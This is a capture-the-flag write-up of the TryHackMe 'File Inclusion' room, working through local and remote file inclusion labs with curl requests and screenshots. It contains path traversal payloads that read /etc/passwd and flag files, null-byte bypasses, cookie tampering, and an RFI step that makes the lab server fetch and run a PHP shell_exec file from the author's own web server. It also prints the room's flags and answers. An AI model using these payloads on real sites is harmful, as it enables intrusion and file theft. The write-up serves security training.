---
title: File Inclusion   
author: CYB3RM3
name: CYB3RM3 | File Inclusion   
date: 2021-10-10 18:14:27 +0100
categories: [TryHackMe, Web]
tags: [Web, LFI]
---

This room introduces file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.

THM Room [https://tryhackme.com/room/fileinc](https://tryhackme.com/room/fileinc)


## TASK 1 : Introduction
### Let's continue to the next section to deploy the attached VM. 
No Answer

## TASK 2 : Deploy the VM 
### Once you've deployed the VM, please wait a few minutes for the webserver to start, then progress to the next section! 
No Answer

## TASK 3 : Path Traversal 
### What function causes path traversal vulnerabilities in PHP?
Answer : file_get_contents

## TASK 4 : Local File Inclusion - LFI 
### Give Lab #1 a try to read /etc/passwd. What would the request URI be? 

![/etc/passwd](/images/thm/fileinc/fileinc_1.png)
_/etc/passwd_

http://10.10.170.89/lab1.php?file=%2Fetc%2Fpasswd

Answer : lab1.php?file=/etc/passwd

### In Lab #2, what is the directory specified in the include function?

![Include](/images/thm/fileinc/fileinc_2.png)
_Include_

Answer : includes

## TASK 5 : Local File Inclusion - LFI #2 
### Give Lab #3 a try to read /etc/passwd. What is the request look like? 

![Lab 3](/images/thm/fileinc/fileinc_3.png)
_Lab 3_

Answer : /lab3.php?file=../../../../etc/passwd%00

### Which function is causing the directory traversal in Lab #4?

![Lab 4](/images/thm/fileinc/fileinc_4.png)
_Lab 4_

Answer : file_get_contents

### Try out Lab #6 and check what is the directory that has to be in the input field?

![Lab 6](/images/thm/fileinc/fileinc_5.png)
_Lab 6_

Answer : THM-profile/

### Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value? 

![Lab 6 - /etc/os-release](/images/thm/fileinc/fileinc_6.png)
_Lab 6 -/etc/os-release_

Answer : 12.04

## TASK 6 : Remote File Inclusion - RFI 
### We showed how to include PHP pages via RFI. Do research on how to get remote command execution (RCE), and answer the question in the challenge section. 
Firstly, i created a file hello.php containing the "malicious" code :

```console
root@ip-10-10-142-182:~# cd Desktop
root@ip-10-10-142-182:~/Desktop# mkdir RFI
root@ip-10-10-142-182:~/Desktop# cd RFI
root@ip-10-10-142-182:~/Desktop/RFI# nano hello.php
	<?PHP echo "Hello THM"; ?>
```
{: .nolineno }

Then, i run a python snippet code to have a local webserver available :

```python
import http.server
import socketserver

PORT = 8000
Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as http:
        print("serving at port", PORT)
        http.serve_forever()
```

```console
root@ip-10-10-142-182:~/Desktop/RFI# python snippet.py
```
{: .nolineno }

Finally, i search the hello.php file on the local webserver and this print me the "Hello THM" from the hello.php code :

![hello.php](/images/thm/fileinc/fileinc_7.png)
_hello.php_

No Answer.

## TASK 7 : Remediation 
### Ready for the challenges?
No Answer

## TASK 8 : Challenge 
Steps for testing for LFI :

  1-  Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!

  2- Enter a valid input to see how the web server behaves.

  3- Enter invalid inputs, including special characters and common file names.

  4- Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
  
  5- Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.

  6- Understand the input validation and if there are any filters!
  
  7- Try the inject a valid entry to read sensitive files

### Capture Flag1 at /etc/flag1
Crafted a curl command with the request for flag1 :

```console
root@ip-10-10-142-182:~# curl -d "file=../../../etc/flag1" -X POST http://10.10.176.203/challenges/chall1.php

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Lab #Challenge-1</title>


    <!-- Bootstrap core CSS -->
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Stylesheet -->
    <link href="./css/style.css" rel="stylesheet">

    <!-- Core libraries bootstrap & jquery -->
    <script src="./js/bootstrap5.min.js"></script>
    <script src="./js/jquery-3.6.0.min.js"></script>

    <!-- Custom JS code -->
    <script src="./js/script.js"></script>

  </head>

    <header>
<div class="container">
  <ul class="nav">
  	<li class="nav-item">
    		<a class="nav-link" href="./index.php">Home</a>
	</li>
        <li class="nav-item">
                <a class="nav-link">/</a>
        </li>
 	<li class="nav-item">
	<a class="nav-link active" >Lab #Challenge-1</a>
        </li>
  </ul>
</div>
    </header>
<body>
  <div class="container" style="padding-top: 5%;">
      <h1 class="display-4">File Inclusion Lab</h1>
      <p class="lead">Lab #Challenge-1: Include a file in the input form below
<hr class="my-4">
<div class="alert alert-warning" role="alert">
  The input form is broken! You need to send `POST` request with `file` parameter!
  </div>
  <form action= "#" method="GET">
          <div class="input-group mb-3">
            <div class="input-group-prepend">
              <span class="input-group-text">File Name</span>
            </div>
            <input name='file' type="text" class="form-control" placeholder="For example: welcome.php" aria-label="For example: welcome.php" aria-describedby="basic-addon2">
            <div class="input-group-append">
              <button class="btn btn-success" type="submit" >Include</button>
            </div>
          </div>
        </form>

        <div class='mt-5 mb-5'>
          <h5>Current Path</h5>
          <div class='file-Location'><code>/var/www/html</code></div>
        </div>
        <div>
          <h5>File Content Preview of <b>../../../etc/flag1</b></h5>
	  <code>F1x3d-iNpu7-f0rrn
</code>
    </div>  </body>
</html>
root@ip-10-10-142-182:~#
```
{: .nolineno }

Or change the form method on the page :

![Challenge 1](/images/thm/fileinc/fileinc_8.png)
_Challenge 1_

Answer : F1x3d-iNpu7-f0rrn

### Capture Flag2 at /etc/flag2

This challenge is about cookie LFI. Once in the challenge, you'll be block with a guest access :

![Challenge 2](/images/thm/fileinc/fileinc_9.png)
_Challenge 2_

Changing this cookie to "Admin" for logging as admin on this page :

![Challenge 2 - Admin](/images/thm/fileinc/fileinc_10.png)
_Challenge 2 - Admin_

After many tries, i got the right cookie set for retreiving the flag : ../../../etc/flag2%00

![Challenge 2 - Flag](/images/thm/fileinc/fileinc_11.png)
_Challenge 2 - Flag_

Answer : c00k13_i5_yuMmy1

We see after few tries that there is a .php extension add to the request, so we need to escape this.

```console
root@ip-10-10-29-157:~# curl -d "file=../../../etc/flag3%00" -X POST http://10.10.218.7/challenges/chall3.php --output file.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1952  100  1926  100    26   940k  13000 --:--:-- --:--:-- --:--:--  953k
root@ip-10-10-29-157:~# cat file.txt 

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Lab #Challenge 3</title>


    <!-- Bootstrap core CSS -->
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Stylesheet -->
    <link href="./css/style.css" rel="stylesheet">

    <!-- Core libraries bootstrap & jquery -->
    <script src="./js/bootstrap5.min.js"></script>
    <script src="./js/jquery-3.6.0.min.js"></script>

    <!-- Custom JS code -->
    <script src="./js/script.js"></script>

  </head>

    <header>
<div class="container">
  <ul class="nav">
  	<li class="nav-item">
    		<a class="nav-link" href="./index.php">Home</a>
	</li>
        <li class="nav-item">
                <a class="nav-link">/</a>
        </li>
 	<li class="nav-item">
	<a class="nav-link active" >Lab #Challenge 3</a>
        </li>
  </ul>
</div>
    </header>
<body>
  <div class="container" style="padding-top: 5%;">
      <h1 class="display-4">File Inclusion Lab</h1>
      <p class="lead">Lab #Challenge 3: Include a file in the input form below
<hr class="my-4">
	<form action= ".//chall3.php" method="GET">
          <div class="input-group mb-3">
            <div class="input-group-prepend">
              <span class="input-group-text">File Name</span>
            </div>
            <input name='file' type="text" class="form-control" placeholder="For example: welcome" aria-label="For example: welcome" aria-describedby="basic-addon2">
            <div class="input-group-append">
              <button class="btn btn-success" type="submit" >Include</button>
            </div>
          </div>    
        </form>
	
        <div class='mt-5 mb-5'>
          <h5>Current Path</h5>
          <div class='file-Location'><code>/var/www/html</code></div>
        </div>
        <div>
          <h5>File Content Preview of <b>../../../etc/flag3</b></h5>
	  <code>P0st_1s_w0rk1in9
</code>
    </div>  </body>
</html>
```
{: .nolineno }

Answer : P0st_1s_w0rk1in9

### Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?

For this last challenge, I do the same as TASK 6 :
1- snippet python for local webserver

2- hello.php code :

```php
<?php echo shell_exec('hostname'); ?>
```

Then you just need to call your file hello.php from RFI execution :

![Playground](/images/thm/fileinc/fileinc_12.png)
_Playground_

Answer : lfi-vm-thm-f8c5b1a78692